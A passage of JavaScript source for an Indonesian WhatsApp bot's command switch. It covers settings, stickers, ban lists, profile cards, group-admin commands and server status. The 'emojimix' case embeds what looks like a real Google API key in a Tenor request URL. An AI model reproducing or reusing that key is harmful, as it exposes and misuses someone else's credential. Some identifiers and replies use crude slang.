	let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
	let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem
	
	let teks =`System Information`
	 teks +=`
	
	Uptime : ${kyun(os.uptime())}
	
	*OS INFO*
	Platform: ${platform}
	Distro: ${distro}
	Release: ${release}
	Codename: ${codename}
	Kernel: ${kernel}
	Arch: ${arch}
	Hostname: ${hostname}
	Codepage: ${codepage}
	
	*CPU INFO*
	Manufacturer: ${manufacturer}
	Brand: ${brand}
	Vendor: ${vendor}
	Family: ${family}
	Model: ${model}
	Speed: ${speed} Ghz
	Governor: ${governor}
	Cores: ${cores}
	PhysicalCores: ${physicalCores}
	Processors: ${processors}
	
	*MEMORY INFO*
	Memory : ${FileSize(used)}/${FileSize(total)} 
	Free : ${FileSize(free)}
	Cached: ${FileSize(cached)}
	`
	setReply(teks)
	 }    
	break    
	
		
	
	
	case 'setprefix':
		{
	if (!isOwner) return onlyOwner()
	let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
	if (q === 'multi'){
	multi = true
	nopref = false
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (q === 'nopref'){
	multi = false
	nopref = true
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (q === 'allpref'){
	multi = false
	nopref = false
	allpref = true
	setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
	} else if (!q) {
	conn.sendButMessage(from, teks, copyright, [
	{buttonId: `${prefix}setprefix multi`, buttonText: {displayText: `ᴍᴜʟᴛɪ`},type: 1},
	{buttonId: `${prefix}setprefix nopref`, buttonText: {displayText: `ɴᴏᴘʀᴇғ`},type: 1},
	{buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ`},type: 1}]);
	 } else {
	multi = false
	nopref = false
	prefa = `${q}`
	setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
	 } 
	}
	break  
	
	
	case 'setreply':{
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
	if(replyType === "web") return setReply("Udah aktif")
	replyType = "web"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	}  else if ((args[0]) === 'mess'){
	if(replyType === "mess") return setReply("Udah aktif")
	replyType = "mess"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	} else if ((args[0]) === 'troli' ){
	if(replyType === "troli") return setReply("Udah aktif")
	replyType = "troli"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	}  else if ((args[0]) === 'quoted' ){
	if(replyType === 'quoted') return setReply("Udah aktif")
	replyType = "quoted"
	setReply(`Berhasil mengubah set reply ke ${q}`)
	} else if (!q) {
	conn.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
	{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ϙᴜᴏᴛᴇᴅ`},type: 1},
	{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
	 } else {
	replyType = q
	 setReply("Set Reply Tidak Di Temukan")
	}
	}
	break
	
	
	
	
	
	
	
	
	
	case 'take':
	if (isImage || isQuotedImage|| isQuotedSticker) {
	try{
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `EXTREAM`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
	} catch (err){
	console.log(err)
	}
	}
	break
	
	
	
	case 'setwelcome':{
		if ((args[0]) === 'type1' ) {
		if(setwelcome === "type1") return setReply("Udah aktif")
		setwelcome = "type1"
		setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
		} else if ((args[0]) === 'type2' ) {
		if(setwelcome === "type2") return setReply("Udah aktif")
		setwelcome = "type2"
		setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
		} else if ((args[0]) === 'type3' ) {
	   if(setwelcome === "type3") return setReply("Udah aktif")
		setwelcome = "type3"
		setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
		} else if(!q){
		setReply("Pilih setwelcome : type1 atau type2 atau type3")
		} else {
		setReply("Query tidak di temukan")
		}
		}
		break
	
		
		
		
	 
	
		case 'ban':{
			let alasan = ""
			if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner') 
			if (q.startsWith("+")) {
			let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
			let Name = await conn.getName(woke)
			if(cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
			addBanned(Name,calender,woke,alasan, ban)          
			setReply( `Berhasil banned @${woke}`);
			} else  if(users){
			let alasan = mentionByReply? q : mentionByTag? q.split(" ")[1] : "" 
			if(alasan == undefined) alasan = "Tidak ada"
			let Nomer = `${users.split("@")[0]}`
			if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
			let Name = await conn.getName(users)
			//if(Nomer === ownerNumber[0]) return setReply("Ga mau") 
			addBanned(Name,calender,Nomer,alasan, ban)               
			setReply( `Berhasil banned @${users.split("@")[0]}`);
			} else setReply('Reply atau tag targetnya')
			}
			break
	
		
			case 'unban':{
				if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner') 
				if (q.startsWith("+")) {
				let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
				if(!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
				unBanned (woke, ban)             
				setReply( `Berhasil unbanned @${woke}`);
				} else  if(users){
				let Nomer =`${users.split("@")[0]}`
				if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
				//if(Nomer === Ownerin) return setReply("Ga mau")
				unBanned (Nomer, ban)             
				setReply( `Berhasil unbanned @${users.split("@")[0]}`);
				} else setReply('Reply atau tag targetnya')
				}
				break
	
	case 'listban':
//if (!isOwner) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
ban.map(function(e, i){
banya +=(i+1)+`. Nomer : @${e.id}\n└▸ Tanggal : ${e.date}\n└▸ Alasan : ${e.reason} \n\n`            
 });
setReply(banya)
break
	
	
	case 'clearallban':{
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all ban")
	let nana = Object.keys(db.data.users)
	let obj = []
	for(let i of nana){
	if(db.data.users[i].banned.status) db.data.users[i].banned.status = false
	}
	}
	break 
	
	case 'adderror':
	{
	if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
	if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
	let oke = q.split("|")[0]
	let oka = q.split("|")[1]
	addError(oke, oka, listerror)
	await setReply(`Sukses Menambahkan ${q} ke daftar error`)
	}
	break
	
	
	case 'clearallerror':
	if (!isOwner) return onlyOwner()
	setReply("SukseS clear all error")
	clearAllError(listerror)
	break 
	
	case 'delerror':{
	if (!itsMe && !isOwner) return reply (mess.only.ownerB)
	listerror.splice(q, 1)
	fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
	setReply( `Sukses menghapus ${q} di daftar error`)
	}
	break
	
	case 'listerror': {
	let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
	for (let i of db.data.listerror){          
	errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
	} 
	errornye += `© ${fake1}`
	setReply(errornye)
	}
	break
	
	
	
	
	
	
	
	
	
	case 'setnamebot':
	if (!isOwner) return onlyOwner()
	setReply(`Berhasil mengubah nama bot ke ${q}`)
	fake = `${q}`
	break
	
	
	case 'setthumb':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/thumb.jpeg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah thumbnail`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
	}
	}
	break;
	
	
	
	
	case 'setimgreply':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/reply.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image reply`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
	}
	}
	break;
			
			
	
	case 'setimginfo':{
	if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/bot.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image pada infobotz`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
	}
	}
	break;
	
	case 'addvn':{
	const client = require('filestack-js').init(fileStackApi);
	if(!isQuotedAudio) return setReply("Reply audio")
	if(!q) return setReply("Nama audionya apa?")
	if(db.data.audio[q]) return setReply("Nama tersebut sudah ada di dalam database")
	let media = await conn.downloadAndSaveMediaMessage(quoted, q)
	await client.upload(media, {}, { filename: q }, {}).then(data => {  
	db.data.audio[q] = { 
	name: data._file.name,
	id: data.handle,
	size: FileSize(data._file.size), 
	link: data.url
	}
	})
	let teks = `Berhasil menambahkan audio
	ke dalam database dengan nama *${q}*`
	await setReply(teks)
	await fs.unlinkSync(media)
	}
	break 
	
	case 'delvn':{
	if (!isOwner) return onlyOwner() 
	try {
	if(!db.data.audio[q]) return setReply("Nama tersebut tidak ada di dalam data base")
	delete db.data.audio[q]
	setReply(`Sukses delete vn ${q}`)
	} catch (err){
	console.log(err)
	setReply('eror kak')
	}
	}
	break
	
	
	 case 'addstik':{
	const client = require('filestack-js').init(fileStackApi);
	if(!isQuotedSticker) return setReply("Reply sticker")
	if(!q) return setReply("Nama stickernya apa?")
	if(db.data.sticker[q]) return setReply("Nama tersebut sudah ada di dalam database")
	let media = await conn.downloadAndSaveMediaMessage(quoted, q)
	await client.upload(media, {}, { filename: q }, {}).then(data => {  
	db.data.sticker[q] = { 
	name: data._file.name,
	id: data.handle,
	size: FileSize(data._file.size), 
	link: data.url
	}
	})
	let teks = `Berhasil menambahkan sticker
	ke dalam database dengan nama *${q}*`
	await setReply(teks)
	await fs.unlinkSync(media)
	}
	break
	
					
	
	case 'delstik':{
	if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
	if (!q) return setReply("Masukan query")
	try {
	if(!db.data.sticker[q]) return setReply("Nama tersebut tidak ada di dalam data base")
	delete db.data.sticker[q]
	setReply(`Succes delete sticker ${q}!`)
	} catch (err) {
	console.log(err)
	setReply(`Gagal delete sticker ${q}!`)
	}
	}
	break
		
	case 'liststik':{
	let teks = '*Sticker list :*\n\n'
	for (let awokwkwk of Object.keys(db.data.sticker)) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `\n*Total : ${Object.keys(db.data.sticker).length}*`
	setReply(teks)
	}
	break
					
					
					
	case 'listvn':
	{
	let teks = '*List Vn:*\n\n'
	for (let awokwkwk of Object.keys(db.data.audio)) {
	teks += `- ${awokwkwk}\n`
	}
	teks += `\n*Total ada : ${Object.keys(db.data.audio).length}*`
	teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
	setReply(teks)
	}
	break
			
	
	
	case 'patrick':
	setReply(mess.wait)
	await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
	.then(res => res.text())
	.then(body => {
	let tod = body.split("\n");
	let pjr = tod[Math.floor(Math.random() * tod.length)];
	conn.sendImageAsSticker(from, pjr, dev)
	}
	)
	break
	
	case 'gura':
	setReply(mess.wait)
	await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
	.then(res => res.text())
	.then(body => {
	let tod = body.split("\n");
	let pjr = tod[Math.floor(Math.random() * tod.length)];
	conn.sendImageAsSticker(from, pjr, dev)
	}
	)
	break
	
	case 'doge':
	setReply(mess.wait)
	await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
	.then(res => res.text())
	.then(body => {
	let tod = body.split("\n");
	let pjr = tod[Math.floor(Math.random() * tod.length)];
	//conn.sendMedia (from, pjr, dev, {caption: "Nih"})
	conn.sendImageAsSticker(from, pjr, dev)
	}
	)
	break
	
	
	
	case 'me': {
	let ppimg = await conn.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	const { userXp, userLeveling, } = require("../lib/user");
	try{
	 let sol = await conn.fetchStatus(sender)
	var stst = sol.status == undefined ? '' : sol.status 
	} catch(err){
	var stst = ""
	  
	}
	let persenya =`${userPersen}`
	let nana =`${userExp}/${requiredExp}`
	
	let prmm = isPremium? isOwner? 'Premium' : user? user.premiumDate : '' : 'Not Premium'
	 //
	let teks = `*]────「 Profile User 」────[*
	
	🆔 Nama : ${pushname} 
	💳 Saldo  : Rp ${db.data.users[sender].balance.toLocaleString()}
	✅ Verified : ${userVerified}
	📇 Status : ${isPremium ? 'Premium':'Free'}
	🧬 Level : ${userLevel}
	🔰 Grade : ${userLeveling(`${db.data.users[sender].level}`)}
	⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
	♻️ Total Exp : ${nana}
	📟 User Hit : ${db.data.users[sender].hit}
	🤖 Status Bot : ${isOwner ? 'Owner':'User'}
	🕔 Expired : ${prmm}
	📉 Limit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}
	📈 Limit Game : ${db.data.users[sender].glimit}/${gcounti.user}
	📲 No : wa.me/${sender.split("@")[0]}
	🧸 Bio : ${stst}`
	
	
	let its = await getBuffer (ppimg)
	
	const canvacord = require("canvacord");
	  let image3 = new canvacord.Rank()
	  .setAvatar(its)
	  .setCurrentXP(math(userExp))
	  .setRequiredXP(requiredExp)
	  .setStatus("online")
	  .setProgressBar("#FFFFFF", "COLOR")
	  .setBackground( "COLOR","#141414")
	  .setCustomStatusColor("#ff1a8c")  
	  .setUsername(`EXP: ${persenya.split(".")[0]}%,`)
	  .setLevel(userLevel)
	  .setRank(4)
	  .setOverlay("#3d3d3d")
	  .setDiscriminator("0007");
	  
	  let foto = await getRandom(".png")
	  image3.build()
	  .then(async data => {
	  await canvacord.write(data,foto);
	  let gambar = await fs.readFileSync(foto)
	  let butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];          
	  let buttonMessage = {
	  image:gambar,
	  caption: teks,
	  footer: copyright,
	  buttons: butprofile,
	  headerType: 4
	  }
	  
	  await conn.sendMessage(from, buttonMessage)
	  await fs.unlinkSync(foto)
			  });
	
	}
	 
	break
	
	case 'readmore':{
	const more = String.fromCharCode(8206)
	const readmore = more.repeat(4001)
	if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
	const text1 = q.substring(0, q.indexOf('|') - 0)
	const text2 = q.substring(q.lastIndexOf('|') + 1)
	setReply(`${text1}${readmore}${text2}`)
	}
	break
	/////----------------------------------]]]------------------------------------------------------------
	case 'clearallblock':{
	if (!isOwner) return onlyOwner()
	let obj = [] 
	fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
	await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
	}
	break 
	
	case 'setmenu':
		if(!isOwner) return onlyOwner()
		if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
			setmenu = "katalog"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			} else  if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
			setmenu = "location2"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
			setmenu = "image"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			} else if ((args[0]) === 'lokasi' ){
			setmenu = "location"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
						} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
			setmenu = "image2"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			}else if ((args[0]) === 'pptx'){
			docType = "pptx"
			setmenu = "document"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			} else if ((args[0]) === 'xlsx'){
			docType = "xlsx"
			setmenu = "document"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
		} else if ((args[0]) === 'zip'){
			docType = "zip"
			setmenu = "document"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
			} else if ((args[0]) === 'pdf'){
			docType = "pdf"
			setmenu = "document"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
		} else if ((args[0]) === 'docx'){
			docType = "docx"
			setmenu = "document"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
		} else if ((args[0]) === 'gif'){
			setmenu = "gif"
			await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
						  {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
		}  else if (!q) {
						  conn.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif`, `Silahkan pilih salah satu`, [
						  {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
						  {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
						  {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}],setQuoted);
						} else {
						setReply("Menu tidak di temukan om")
						}
		break
	
	
	case 'getppgc':
	if (!isGroup) return 
	setReply(mess.wait)
	try {
	var ppimg = await conn.profilePictureUrl(from, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await conn.sendMessage(from, { image: { url: ppimg }}, { quoted: dev })
	break 
	
	
	case 'getpp':
	if (isGroup) { 
	if(mentionByTag){
	console.log(mentionByTag[0])
	try {
	var ppimg = await conn.profilePictureUrl(mentionByTag[0],"image")
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await conn.sendMessage(from, { caption: "Nih", image: { url: ppimg }}, { quoted: dev })
	
	} else if (mentionByReply){
	try {
	var ppimg = await conn.profilePictureUrl(mentionByReply, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await conn.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true },caption: "Nih", image: { url: ppimg }}, { quoted: dev })
	} 
	} else if(!isGroup){
	try {
	var ppimg = await conn.profilePictureUrl(from, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await conn.sendMessage(from, {caption: "Nih",  image: { url: ppimg }}, { quoted: dev })
	}
	
	break
	
		
	case 'grupwa': 
	if (!q) return reply(`Kirim perintah ${command} nama grup`)
	setReply(mess.wait)
	hxz.linkwa(q).then(async(data) => {
	if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
	var teks = `*Hasil Pencarian Dari ${q}*\n\n`
	for (let x of data) {
	teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
	}
	reply(teks)
	}).catch(() => reply(mess.error.api))
	break
				
				
				
	case 'linkgc':{
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return reply(mess.Badmin)
	var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
	let asu = 'https://chat.whatsapp.com/'+url
	setReply(asu)
	 }
	break
				
	case 'setnamegc':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (!q) return reply(`Kirim perintah ${command} teks`)
	await conn.groupUpdateSubject(from, q)
	.then( res => {
	setReply(`Sukses`)
	}).catch(() => setReply(mess.error.api))
	break
	
	case 'setdesc': 
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (!q) return reply(`Kirim perintah ${command} teks`)
	await conn.groupUpdateDescription(from, q)
	.then( res => {
	setReply(`Sukses`)
	}).catch(() => reply(mess.error.api))
	break
					
	case 'gc':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	if (args[0] == "close") {
	conn.groupSettingUpdate(from, 'announcement')
	setReply(`Sukses mengizinkan hanya admin yang dapat men�girim pesan ke grup ini`)
	} else if (args[0] == "open") {
	conn.groupSettingUpdate(from, 'not_announcement')
	setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
	} else {
	setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	}
	break
	
	case 'revoke':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupRevokeInvite(from)
	.then( res => {
	setReply(`Sukses menyetel tautan undangan grup ini`)
	}).catch(() => reply(mess.error.api))
	break
				
	
	case 'status':{
	let osu = require('node-os-utils')
		try {
			let NotDetect = 'Not Detect'
			let old = performance.now()
			let cpu = osu.cpu
			let cpuCore = cpu.count()
			let drive = osu.drive
			let mem = osu.mem
			let netstat = osu.netstat
			let OS = osu.os.platform()
			let cpuModel = cpu.model()
			let cpuPer
			let p1 = cpu.usage().then(cpuPercentage => {
				var cpuPer = cpuPercentage
			}).catch(() => {
				var cpuPer = NotDetect
			})
			let driveTotal, driveUsed, drivePer
			let p2 = drive.info().then(info => {
				driveTotal = (info.totalGb + ' GB'),
					driveUsed = info.usedGb,
					drivePer = (info.usedPercentage + '%')
			}).catch(() => {
				driveTotal = NotDetect,
					driveUsed = NotDetect,
					drivePer = NotDetect
			})
			let ramTotal, ramUsed
			let p3 = mem.info().then(info => {
				ramTotal = info.totalMemMb,
					ramUsed = info.usedMemMb
			}).catch(() => {
				ramTotal = NotDetect,
					ramUsed = NotDetect
			})
			let netsIn, netsOut
			let p4 = netstat.inOut().then(info => {
				netsIn = (info.total.inputMb + ' MB'),
					netsOut = (info.total.outputMb + ' MB')
			}).catch(() => {
				netsIn = NotDetect,
					netsOut = NotDetect
			})
			await Promise.all([p1, p2, p3, p4])
			await setReply(`_Testing ${command }..._`)
			let _ramTotal = (ramTotal + ' MB')
			let neww = performance.now()
			let teks =`
	*「 Status 」*
	
	OS : *${OS}*
	CPU Model : *${cpuModel}*
	CPU Core : *${cpuCore} Core*
	CPU : *${cpuPer? `${cpuPer}%`:"Not Found"}*
	Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) &&  /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
	Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
	Ping : *${Math.round(neww - old)} ms*
	Internet IN : *${netsIn}*
	Internet OUT : *${netsOut}*
	`
	let mok = [{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
						{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
	
	conn.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/thumb.jpeg'), mok)
	} catch (err) {
	setReply(err)
	}
	}
	 
	break
	
				
	case 'listonline': {
	let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
	let online = [...Object.keys(store.presences[id]), botNumber]
	conn.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, dev, { mentions: online })
	}
	break			
				
	case 'wallpapermobile':{
	let link =`https://megayaa.herokuapp.com/api/akaneko/mobileWallpapers`
	let nana = await getBuffer(link)     
	conn.sendImage(from, nana, "Nih",dev)
	}
	break
	
	case 'wallpapers':{
	let link =`https://megayaa.herokuapp.com/api/akaneko/wallpapers`
	let nana = await getBuffer(link)     
	conn.sendImage(from, nana, "Nih",dev)
	}
	break
	
	case 'emojimix': {
	let [emoji1, emoji2] = q.split`+`
	if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
	if (!emoji2) return setReply( `Example : ${prefix + command} 😅+??`)
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
	for (let res of anu.results) {
	await conn.sendImageAsSticker(from, res.url, dev)
	  //conn.sendStimg(from, res.url, dev)
	//await fs.unlinkSync(encmedia)
	}
	}
	break
	
	case 'getcaze':
	case 'getcase':
	try{
	if (!dev.key.fromMe && !isOwner) return setReply(mess.only.owner)
	if (!q) return setReply("*Mau nyari Case apa kak*") 
	if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
	let nana = await getCase(q)
	setReply(nana)
	} catch(err){
